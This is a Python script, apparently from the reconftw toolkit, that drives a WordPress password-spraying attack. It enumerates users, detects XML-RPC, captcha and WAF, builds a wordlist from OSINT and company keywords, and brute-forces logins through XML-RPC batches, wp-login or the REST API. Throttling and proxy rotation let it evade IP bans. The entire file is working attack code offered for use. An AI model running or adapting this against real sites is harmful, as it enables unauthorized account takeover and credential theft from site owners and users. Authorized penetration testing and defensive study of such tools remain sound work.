#!/usr/bin/env python3
"""WordPress spray: recon + strategy + hybrid wordlist + attack (reconftw)."""
import argparse
import json
import os
import sys
import time
import urllib3

urllib3.disable_warnings()


def parse_args():
    p = argparse.ArgumentParser(description="WP hybrid spray (reconftw)")
    p.add_argument("-u", "--url", required=True, help="Target WordPress URL")
    p.add_argument("-U", "--users", default="", help="Usernames (comma separated); merged with recon users")
    p.add_argument("--priority-wordlist", required=True, help="Short list + osint passwords (tried first)")
    p.add_argument("--scan-json", help="Load/save recon JSON (run live scan if missing)")
    p.add_argument("--no-scan", action="store_true", help="Do not run live scan (requires valid --scan-json)")
    p.add_argument("--method", default="auto", choices=["auto", "xmlrpc", "wplogin", "restapi"])
    p.add_argument("--batch-size", type=int, default=50)
    p.add_argument("--delay", type=float, default=3.0)
    p.add_argument("--max-passwords", type=int, default=0, help="0 = unlimited")
    p.add_argument("--company", help="Company name for wp-brute-pro generator")
    p.add_argument("--keywords", help="Extra keywords for generator")
    p.add_argument("--crawl", action="store_true", help="Crawl target for generator keywords")
    p.add_argument("--output", required=True, help="Output directory")
    p.add_argument("--tool-root", help="wp-brute-pro install path")
    p.add_argument("--proxy-list", help="Proxy list file")
    p.add_argument("--export-json", help="Export results JSON path")
    p.add_argument("--resume", action="store_true")
    p.add_argument(
        "--dry-run",
        action="store_true",
        help="Build and save wordlist only (no attack)",
    )
    p.add_argument("--lang", default="en", help="wp-brute-pro UI language")
    p.add_argument("-v", "--verbose", action="store_true", help="Colored TUI with progress bar")
    p.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    return p.parse_args()


def format_eta(seconds):
    if seconds < 60:
        return f"{int(seconds)}s"
    if seconds < 3600:
        return f"{int(seconds // 60)}m {int(seconds % 60)}s"
    h = int(seconds // 3600)
    m = int((seconds % 3600) // 60)
    return f"{h}h {m}m"


def load_lines(path):
    passwords = []
    if not path or not os.path.isfile(path):
        return passwords
    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        for line in handle:
            pwd = line.strip()
            if pwd and 3 <= len(pwd) <= 64:
                passwords.append(pwd)
    return passwords


def merge_password_lists(priority, generated, max_passwords):
    merged = []
    seen = set()
    for pwd in priority + generated:
        if pwd in seen:
            continue
        seen.add(pwd)
        merged.append(pwd)
        if max_passwords > 0 and len(merged) >= max_passwords:
            break
    return merged


def load_scan_json(path):
    if not path:
        return None
    if not os.path.isabs(path):
        path = os.path.abspath(path)
    if not os.path.isfile(path):
        return None
    with open(path, "r", encoding="utf-8") as handle:
        data = json.load(handle)
    return data if isinstance(data, dict) else None


def as_bool(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        return value.strip().lower() in ("1", "true", "yes", "on")
    return bool(value)


def save_scan_json(path, scan_info):
    if not path:
        return
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(scan_info, handle, indent=2, ensure_ascii=False)


def run_live_scan(url, proxy_rotator, Scanner):
    scanner = Scanner(url, proxies=proxy_rotator.get_current())
    return scanner.scan()


def merge_users(usernames, scan_info, verbose, ui_mod, t_fn):
    if not scan_info:
        return usernames
    for entry in scan_info.get("users", []):
        slug = entry.get("slug") if isinstance(entry, dict) else str(entry)
        if slug and slug not in usernames:
            usernames.append(slug)
            if verbose and ui_mod:
                ui_mod.info(f"  {t_fn('scan_new_user')}: {slug}")
    return usernames


def display_phase1(scan_info, verbose, ui_mod, t_fn):
    if not verbose or not ui_mod or not scan_info:
        return

    xmlrpc_text = (
        f"{t_fn('scan_active')} ({scan_info['xmlrpc_methods']} {t_fn('scan_methods')})"
        if scan_info.get("xmlrpc_active")
        else t_fn("scan_disabled")
    )

    ui_mod.scan_result(
        t_fn("scan_wp"),
        scan_info.get("wp_version") or "?",
        "good" if scan_info.get("wp_version") else "warn",
    )
    ui_mod.scan_result(
        t_fn("scan_login"),
        scan_info.get("login_url") or t_fn("scan_not_found"),
        "good" if scan_info.get("login_url") else "bad",
    )
    ui_mod.scan_result(
        t_fn("scan_xmlrpc"),
        xmlrpc_text,
        "bad" if scan_info.get("xmlrpc_active") else "good",
    )
    ui_mod.scan_result(
        t_fn("scan_captcha"),
        t_fn("scan_yes") if scan_info.get("has_captcha") else t_fn("scan_no"),
        "good" if scan_info.get("has_captcha") else "bad",
    )
    ui_mod.scan_result(
        t_fn("scan_waf"),
        scan_info.get("waf_name") or t_fn("scan_no"),
        "good" if scan_info.get("has_waf") else "bad",
    )
    users_text = ", ".join(
        u.get("slug", "") for u in scan_info.get("users", []) if isinstance(u, dict)
    ) or "?"
    ui_mod.scan_result(
        t_fn("scan_users"),
        users_text,
        "bad" if scan_info.get("users") else "good",
    )
    plugins = scan_info.get("plugins") or []
    ui_mod.scan_result(t_fn("scan_plugins"), ", ".join(plugins[:5]) or "?", "info")


def resolve_method(requested, scan_info, verbose, ui_mod, t_fn):
    method = requested
    xmlrpc_active = scan_info and as_bool(scan_info.get("xmlrpc_active"))
    login_url = scan_info.get("login_url") if scan_info else None

    if method == "auto":
        if xmlrpc_active:
            method = "xmlrpc"
            if verbose and ui_mod:
                ui_mod.success(t_fn("strategy_xmlrpc"))
        elif login_url:
            method = "wplogin"
            if verbose and ui_mod:
                ui_mod.info(t_fn("strategy_wplogin"))
        else:
            method = "restapi"
            if verbose and ui_mod:
                ui_mod.info(t_fn("strategy_restapi"))

    if (
        scan_info
        and scan_info.get("has_captcha")
        and method == "wplogin"
        and xmlrpc_active
    ):
        if verbose and ui_mod:
            ui_mod.warning(t_fn("strategy_captcha_switch"))
        method = "xmlrpc"

    return method


def acquire_scan_info(args, url, proxy_rotator, Scanner, verbose, ui_mod, t_fn, reporter):
    scan_info = load_scan_json(args.scan_json)
    if scan_info:
        if verbose and ui_mod:
            ui_mod.info(f"Loaded recon from {args.scan_json}")
        return scan_info

    if args.no_scan:
        msg = f"Recon required: missing or invalid --scan-json ({args.scan_json or 'not set'})"
        if verbose and ui_mod:
            ui_mod.error(msg)
        else:
            print(msg, file=sys.stderr)
        return None

    if verbose and ui_mod:
        ui_mod.header(t_fn("phase1"))
        ui_mod.spinner(t_fn("scanning"), 1)
    elif reporter:
        reporter.info("Running WordPress reconnaissance scan")

    scan_info = run_live_scan(url, proxy_rotator, Scanner)
    save_scan_json(args.scan_json, scan_info)
    if args.scan_json and reporter:
        reporter.info(f"Recon saved to {args.scan_json}")
    return scan_info


def say(verbose, ui_mod, reporter, kind, msg):
    if verbose and ui_mod:
        getattr(ui_mod, kind)(msg)
    elif reporter:
        if kind == "error":
            reporter.error(msg)
        elif kind == "warning":
            reporter.warning(msg)
        elif kind == "success":
            reporter.success(msg)
        else:
            reporter.info(msg)


def main():
    args = parse_args()
    tool_root = args.tool_root or os.environ.get("WP_BRUTE_TOOL_ROOT", "")
    if not tool_root or not os.path.isdir(tool_root):
        print("wp-brute-pro tool root missing (--tool-root or WP_BRUTE_TOOL_ROOT)", file=sys.stderr)
        return 2

    sys.path.insert(0, tool_root)
    import ui as wp_ui
    from lang import t, set_lang
    from core.scanner import Scanner
    from wordlist.generator import generate
    from core.xmlrpc import XmlRpcAttack
    from core.wplogin import WpLoginAttack
    from core.restapi import RestApiAttack
    from core.validator import Validator
    from evasion.throttle import Throttle
    from evasion.proxy import ProxyRotator
    from state.tracker import Tracker
    from output.reporter import Reporter

    set_lang(args.lang)
    if args.no_color:
        wp_ui.disable_colors()

    url = args.url.rstrip("/")
    usernames = [u.strip() for u in args.users.split(",") if u.strip()]

    if not os.path.isfile(args.priority_wordlist):
        print(f"Priority wordlist not found: {args.priority_wordlist}", file=sys.stderr)
        return 2

    out_dir = args.output
    os.makedirs(out_dir, exist_ok=True)
    reporter = Reporter(out_dir)
    proxy_rotator = ProxyRotator(proxy_file=args.proxy_list)

    if args.verbose:
        wp_ui.banner()

    scan_json = args.scan_json or os.path.join(out_dir, "scan.json")
    args.scan_json = scan_json

    scan_info = acquire_scan_info(args, url, proxy_rotator, Scanner, args.verbose, wp_ui, t, reporter)
    if not scan_info:
        return 2

    if args.verbose:
        if args.no_scan:
            wp_ui.header(t("phase1"))
            wp_ui.info(f"Loaded recon from {args.scan_json}")
        display_phase1(scan_info, args.verbose, wp_ui, t)

    usernames = merge_users(usernames, scan_info, args.verbose, wp_ui, t)
    if not usernames:
        say(args.verbose, wp_ui, reporter, "error", t("no_user"))
        return 2

    if args.verbose:
        wp_ui.header(t("phase2"))

    method = resolve_method(args.method, scan_info, args.verbose, wp_ui, t)
    reporter.info(
        "Strategy from scan.json: "
        f"xmlrpc_active={scan_info.get('xmlrpc_active')}, "
        f"login_url={scan_info.get('login_url') or 'none'}, "
        f"method={method}"
    )
    if args.verbose:
        wp_ui.info(f"{t('stat_method')}: {method}")
        if proxy_rotator.has_proxies():
            wp_ui.info(f"{t('stat_proxy')}: {proxy_rotator.available_count()}")

    if args.verbose:
        wp_ui.header(t("phase3"))
        wp_ui.spinner(t("generating"), 1)

    priority = load_lines(args.priority_wordlist)
    generated = generate(
        usernames=usernames,
        company=args.company or None,
        keywords=args.keywords,
        crawl_url=url if args.crawl else None,
        extra_wordlist=None,
    )
    passwords = merge_password_lists(priority, generated, args.max_passwords)
    if not passwords:
        say(args.verbose, wp_ui, None, "error", "No passwords to try")
        return 2

    priority_file = os.path.join(out_dir, "priority_wordlist.txt")
    with open(priority_file, "w", encoding="utf-8") as handle:
        for pwd in priority:
            handle.write(pwd + "\n")

    wordlist_file = os.path.join(out_dir, "wordlist.txt")
    with open(wordlist_file, "w", encoding="utf-8") as handle:
        for pwd in passwords:
            handle.write(pwd + "\n")

    reporter.info(f"Priority source: {args.priority_wordlist} ({len(priority)} lines -> {priority_file})")
    reporter.info(f"Full spray wordlist ({len(passwords)} lines): {wordlist_file}")
    if args.verbose:
        wp_ui.success(f"Priority list: {priority_file} ({len(priority)} lines)")
        wp_ui.success(f"Full wordlist: {wordlist_file} ({len(passwords)} lines)")
        if priority:
            preview = ", ".join(priority[:8])
            if len(priority) > 8:
                preview += ", ..."
            wp_ui.info(f"First priority passwords: {preview}")

    if args.dry_run:
        return 0

    tracker = Tracker(out_dir)
    throttle = Throttle(args.delay, args.batch_size)
    validator = Validator(url)

    tracker.set_target(url)
    tracker.set_generated(len(passwords))

    summary = (
        f"{len(priority)} priority + {len(generated)} smart-generated "
        f"= {len(passwords)} unique"
    )
    if args.verbose:
        wp_ui.success(f"{len(passwords)} {t('generated')}")
        wp_ui.info(f"{t('users_label')}: {', '.join(usernames)}")
        if args.max_passwords > 0:
            wp_ui.warning(f"{t('stat_max')}: {args.max_passwords}")
    reporter.info(f"Hybrid spray: {summary}, method={method}, users={','.join(usernames)}")

    if args.verbose:
        wp_ui.header(t("phase4"))

    attack_start = time.time()

    for username in usernames:
        todo = tracker.filter_new(username, passwords) if args.resume else passwords
        if not todo:
            say(args.verbose, wp_ui, reporter, "info", f"[{username}] {t('all_tried')}")
            continue

        total_b = (len(todo) + throttle.batch_size - 1) // throttle.batch_size if method == "xmlrpc" else len(todo)
        say(
            args.verbose,
            wp_ui,
            reporter,
            "info",
            f"[{username}] {len(todo)} {t('passwords')}, {total_b} {t('batches')}",
        )
        if args.verbose:
            print()

        found = False

        if method == "xmlrpc":
            attacker = XmlRpcAttack(url)
            user_tried = 0
            user_start = time.time()
            for batch_num, start in enumerate(range(0, len(todo), throttle.batch_size), 1):
                batch = todo[start:start + throttle.batch_size]
                status_code, resp_text = attacker.send_batch(username, batch, proxies=proxy_rotator.get_current())

                if status_code == 200:
                    throttle.success()
                    candidate = attacker.parse_response(resp_text, batch)
                    if candidate and validator.verify(username, candidate):
                        if args.verbose:
                            wp_ui.batch_result(batch_num, total_b, user_tried, len(todo), status="candidate")
                            wp_ui.batch_newline()
                        wp_ui.found_password(username, candidate)
                        reporter.found(username, candidate)
                        tracker.mark_found(username, candidate)
                        found = True
                        break
                    user_tried += len(batch)
                elif status_code in (403, 429, 503):
                    penalty = throttle.blocked(status_code)
                    if args.verbose:
                        wp_ui.batch_result(batch_num, total_b, user_tried, len(todo), status="blocked")
                        wp_ui.batch_newline()
                    say(args.verbose, wp_ui, reporter, "warning", f"HTTP {status_code} — {penalty}s {t('waiting')}")
                    if throttle.is_banned():
                        if proxy_rotator.has_proxies() and proxy_rotator.rotate():
                            throttle.mark_ban()
                            say(args.verbose, wp_ui, reporter, "info", t("banned_proxy"))
                            continue
                        say(args.verbose, wp_ui, reporter, "error", t("ip_banned"))
                        break
                    throttle.wait_penalty(penalty)
                    throttle.mark_ban()
                elif status_code < 0:
                    penalty = throttle.timeout()
                    if args.verbose:
                        wp_ui.batch_result(batch_num, total_b, user_tried, len(todo), status="blocked")
                        wp_ui.batch_newline()
                    say(args.verbose, wp_ui, reporter, "warning", f"{t('connection_lost')} — {penalty}s")
                    throttle.wait_penalty(penalty)
                    throttle.mark_ban()
                else:
                    user_tried += len(batch)

                elapsed = time.time() - user_start
                if user_tried > 0 and elapsed > 0:
                    rate = user_tried / elapsed
                    remaining = len(todo) - user_tried
                    eta_str = format_eta(remaining / rate) if rate > 0 else "..."
                else:
                    eta_str = "..."

                if args.verbose:
                    wp_ui.batch_result(
                        batch_num, total_b, user_tried, len(todo), status="miss", eta=eta_str
                    )

                tracker.mark_tried(username, batch)
                tracker.update_user(username, user_tried)
                throttle.wait()

            if args.verbose:
                wp_ui.batch_newline()
            tracker.update_user(username, user_tried, "found" if found else "done")
            if not found:
                say(
                    args.verbose,
                    wp_ui,
                    reporter,
                    "warning",
                    f"{username}: {t('not_found')} ({user_tried} {t('attempts')})",
                )

        else:
            login_url = scan_info.get("login_url") or f"{url}/wp-login.php"
            attacker = WpLoginAttack(login_url) if method == "wplogin" else RestApiAttack(url)
            tried = 0
            user_start = time.time()
            progress_stride = max(1, min(10, len(todo) // 100 or 1))
            for idx, pwd in enumerate(todo):
                result = attacker.try_login(username, pwd)
                tried += 1
                if result is True and validator.verify(username, pwd):
                    if args.verbose:
                        wp_ui.batch_newline()
                    wp_ui.found_password(username, pwd)
                    reporter.found(username, pwd)
                    tracker.mark_found(username, pwd)
                    found = True
                    break
                if result is None:
                    throttle.timeout()
                    if throttle.is_banned():
                        if args.verbose:
                            wp_ui.batch_newline()
                        say(args.verbose, wp_ui, reporter, "error", t("ban_detected"))
                        break

                if args.verbose and (idx % progress_stride == 0 or idx == len(todo) - 1):
                    elapsed = time.time() - user_start
                    rate = tried / elapsed if elapsed > 0 else 1
                    remaining = len(todo) - tried
                    eta_str = format_eta(remaining / rate) if rate > 0 else "..."
                    wp_ui.batch_result(
                        idx // progress_stride + 1,
                        max(1, len(todo) // progress_stride),
                        tried,
                        len(todo),
                        status="miss",
                        eta=eta_str,
                    )

                tracker.mark_tried(username, [pwd])
                throttle.wait()

            if args.verbose:
                wp_ui.batch_newline()
            tracker.update_user(username, tried, "found" if found else "done")
            if not found:
                say(
                    args.verbose,
                    wp_ui,
                    reporter,
                    "warning",
                    f"{username}: {t('not_found')} ({tried} {t('attempts')})",
                )

        if found:
            break

    if args.verbose:
        print()
        wp_ui.header(t("phase5"))
        wp_ui.stats_table([
            (t("total_tried"), tracker.state.get("total_tried", 0)),
            (t("total_generated"), tracker.state.get("total_generated", 0)),
            (t("found_count"), len(tracker.state.get("found", []))),
            (t("http_requests"), throttle.stats().get("total_requests", 0)),
            (t("blocks"), throttle.stats().get("total_blocks", 0)),
            (t("total_time"), format_eta(time.time() - attack_start)),
        ])

    tracker.save_state()
    reporter.write_report(scan_info, tracker.state, throttle.stats())

    if args.export_json:
        export = {
            "target": url,
            "scan": scan_info,
            "results": tracker.state,
            "throttle": throttle.stats(),
            "mode": "hybrid",
            "priority_count": len(priority),
            "generated_count": len(generated),
            "total_unique": len(passwords),
        }
        with open(args.export_json, "w", encoding="utf-8") as handle:
            json.dump(export, handle, indent=2, ensure_ascii=False)
        if args.verbose:
            wp_ui.success(f"JSON: {args.export_json}")

    if args.verbose:
        wp_ui.info(f"{t('report_at')}: {out_dir}/report.md")
        wp_ui.info(f"{t('log_at')}: {out_dir}/log.txt")

    return 0


if __name__ == "__main__":
    sys.exit(main())
